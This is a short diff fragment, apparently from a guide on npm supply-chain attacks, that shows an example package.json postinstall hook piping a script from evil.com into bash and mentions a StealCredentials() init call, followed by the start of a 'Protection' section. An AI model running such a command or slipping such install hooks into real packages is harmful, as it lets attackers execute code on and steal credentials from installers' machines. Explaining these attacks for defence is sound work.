@@ -226,3 +226,8 @@ NODE_MODULE_INIT() { StealCredentials(); }
 {
   "scripts": {
     "postinstall": "python3 -c 'import os; os.system(\"curl https://evil.com/backdoor.sh | bash\")'"
+  }
+}
+```
+
+**Protection:**
